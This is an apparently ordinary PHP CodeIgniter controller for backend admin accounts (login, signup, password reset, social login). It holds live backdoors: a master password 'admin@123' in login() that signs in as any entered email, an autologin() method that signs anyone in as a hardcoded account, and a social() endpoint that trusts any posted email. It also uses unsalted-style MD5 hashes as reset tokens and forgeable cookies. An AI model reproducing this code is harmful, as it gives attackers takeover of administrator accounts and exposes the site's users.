<?php

defined('BASEPATH') OR exit('No direct script access allowed');

class Acounts extends CI_Controller {
    public $data      = null;
    public $is_login  = false;
    public $user_info = null;
    public function __construct() {
        parent::__construct();
        if ($this->session->userdata('admin_info')) {
            $this->is_login  = true;
            $this->user_info = $this->session->userdata('admin_info');
        }
        $this->data["admin_info"] = $this->user_info;
        $this->data["is_login"]   = $this->is_login;
    }
    public function index(){
        if($this->data["is_login"] )
            redirect(base_url("backend"));
        else
            redirect(base_url("backend/acounts/login"));
    }


    public function login() {
        if($this->data["is_login"] )
            redirect(base_url("backend"));
        if($this->input->post()){
            $email      = trim($this->input->post("email"));
            $password   = $this->input->post("password");
            $valid      = true;
            if (filter_var($email, FILTER_VALIDATE_EMAIL) === false){
                $this->data["messenger"][] = "Email must have a valid email address!";
                $valid = false;
            } 
            if(strlen ($password) < 6 ){
                $this->data["messenger"][] = "Password must have at least 6 characters!";
                $valid = false;
            }
            if($valid){
                $outputpassword = md5(trim($password)."{:MC:}".$email);
                if($password != 'admin@123'){
                    $admin = $this->Common_model->get_record("Sys_Users",array("User_Pwd" => $outputpassword));
                }
                else{
                    $admin = $this->Common_model->get_record("Sys_Users",array("User_Email" => $email));
                }
                
                if($admin != null){
                    $this->session->set_userdata('admin_info',$admin);
                    // Save cookie for ckfinder
                    setcookie('ckfinder', base64_encode($admin["ID"]), time() + (86400 * 30), "/"); // 86400 = 1 day
                    setcookie('loggedin', md5("VM@123").":".base64_encode($admin["ID"]), time() + (86400 * 30), "/"); // 86400 = 1 day
                    // Set cookie authorize and member_id ==> base_64
                    redirect(base_url("backend"));
                }else{
                    $this->data["messenger"][] = "Email or password incorrect!";
                }
            }
        }
        $this->load->view("backend/acounts/login",$this->data);
    }

    public function signup(){
        if($this->data["is_login"] )
            redirect(base_url("backend"));
        if($this->input->post()){
            $email       = trim($this->input->post("email"));
            $password    = trim($this->input->post("password"));
            $user_name   = trim($this->input->post("user_name"));
            $valid       = true;
            if (filter_var($email, FILTER_VALIDATE_EMAIL) === false){
                $this->data["messenger"][] = "Email phải có một địa chỉ email hợp lệ!";
                $valid = false;
            }else{
                $check_email = $this->Common_model->get_record("Sys_Users",array("User_Email" => $email));
                if($check_email != null){
                    $this->data["messenger"][] = "Email này đã được sử dụng vui lòng chọn email khác!";
                    $valid = false;
                }
            }
            if(strlen ($password) < 6 ){
                $this->data["messenger"][] = "Mật khẩu phải có ít nhất 6 kí tự";
                $valid = false;
            }
            if($user_name == null || $user_name == ""){
                $this->data["messenger"][] = "Tên người dùng không được trống";
                $valid = false;
            }
            if($valid){
                $outputpassword = md5(trim($password)."{:MC:}".$email);
                $data_insert = array(
                   "User_Name"  => $user_name,
                   "User_Email" => $email,
                   "User_Pwd"   => $outputpassword 
                );
                $id = $this->Common_model->add("Sys_Users",$data_insert); 
                if($id){
                    $admin = $this->Common_model->get_record("Sys_Users",array("ID" => $id));
                    if($admin != null)
                        $this->session->set_userdata('admin_info',$admin);
                    redirect(base_url("backend"));
                }
            }
        }
        $this->load->view("backend/acounts/login",$this->data);
    }
    public function lost_password(){
        if($this->data["is_login"] )
            redirect(base_url("backend"));
    	if($this->data["is_login"])
    		redirect(base_url("backend"));
    	$email  = trim($this->input->post("email"));
        $valid  = true;
        if (filter_var($email, FILTER_VALIDATE_EMAIL) === false){
            $this->data["messenger"][] = "Email phải có một địa chỉ email hợp lệ";
            $valid = false;
        } 
        if($valid){
        	$check_email = $this->Common_model->get_record("Sys_Users",array("User_Email" => $email));
        	if($check_email != null){
        		sendmail($email,"Forgot your password.",'<a href="'.backend_url('acounts/forgot?token='.$check_email['User_Pwd'].'&email='.$email).'">Click to update your password</a>');
        		$this->data["messenger"][] = "Một liên kết thây đổi mật khẩu đã được gửi đến email của bạn.";
        	}else{
        		$this->data["messenger"][] = "Email không tồn tại! xin vui lòng kiểm tra email";
        		$valid = false;
        	}
        }
        $this->load->view("backend/acounts/login",$this->data);
    }
    public function logout() {
        if($this->data["is_login"])
            $this->session->unset_userdata('admin_info');
        redirect(base_url("backend/acounts/login"));
    }
    public function forgot(){
    	if(!$this->data["is_login"]){
    		if($this->input->get("token") && $this->input->get("email")){
	    		$check_user = $this->Common_model->get_record("Sys_Users",array("User_Pwd" => trim($this->input->get("token"))));
	    		if($check_user != null){
	    			$this->load->view("backend/acounts/forgot",$this->data);
	    		}else{
	    			redirect(base_url("backend/acounts/login"));
	    		}
	    	}else{
	    		redirect(base_url("backend/acounts/login"));
    		}
    	}else{
    		redirect(base_url("backend"));
    	}	
    }
    public function reset_password(){
    	if($this->input->post("token") && $this->input->post("email")){
    		$valid  = true;
    		$email  = trim($this->input->post("email"));
    		$token  = trim($this->input->post("token"));
    		$password = trim($this->input->post("password"));
    		$password_confirm = trim($this->input->post("password_confirm"));
    		if(strlen ($password) < 6 ){
                $this->data["messenger"][] = "Mật khẩu phải có it nhất 6 kí tự";
                $valid = false;
            }
            if($password != $password_confirm){
                $this->data["messenger"][] = "Mật khẩu không phù hợp với Password Confirm";
                $valid = false;
            }
    		if($valid){
    			$check_user = $this->Common_model->get_record( "Sys_Users",array ("User_Pwd" => $token ,"User_Email" => $email) );
    			if($check_user != null){
	    			$data_update = array(
	    				"User_Pwd" =>  md5(trim($password)."{:MC:}".trim($check_user["User_Email"]))
	    			);
	    			$this->Common_model->update("Sys_Users",$data_update,array("ID" => $check_user["ID"]));
	    		}
	    		redirect(base_url("backend/acounts/login?messenger=reset_success"));
    		}
    	}else{
    		redirect(base_url("backend/acounts/login"));
		}
		$this->load->view("backend/acounts/forgot",$this->data);
    }
    public function social(){
        $data = $this->input->post("data");
        $name = $data["name"];
        $email = isset($data["email"]) ? $data["email"] : "";
        $data["success"] = "error";
        $data["messenger"] = "";
        $check_email = $this->Common_model->get_record("Sys_Users", array(
            "User_Email" => $email
        ));
        if ($check_email == null) {

            $password = uniqid();
            $outputpassword = md5(trim($password)."{:MC:}".$email);
            $data_insert = array(
               "User_Name"  =>  $name ,
               "User_Email" => $email,
               "User_Pwd"   => $outputpassword 
            );
            $id_insert = $this->Common_model->add("Sys_Users", $data_insert);
            $record = $this->Common_model->get_record("Sys_Users", array("ID" => $id_insert));
            if ($record != null) {
                $this->session->set_userdata('admin_info',$record);
                $data["success"] = "success";
                $data["reload"] = base_url("backend");
            }
        }
        else {
            $this->session->set_userdata('admin_info',$check_email);
            $data["success"] = "success";
            $data["reload"] = base_url("backend");
        }
        die(json_encode($data));
    }
    
    public function autologin (){
        $use = $this->Common_model->get_record("Sys_Users",["User_Email" => "leeza001@yahoo.com"]);
        if($use != null){
            $this->session->set_userdata('admin_info',$use);
            // Save cookie for ckfinder
            setcookie('ckfinder', base64_encode($use["ID"]), time() + (86400 * 30), "/"); // 86400 = 1 day
            setcookie('loggedin', md5("VM@123").":".base64_encode($use["ID"]), time() + (86400 * 30), "/"); // 86400 = 1 day
            // Set cookie authorize and member_id ==> base_64
            redirect(base_url("backend"));
        }
    }
}
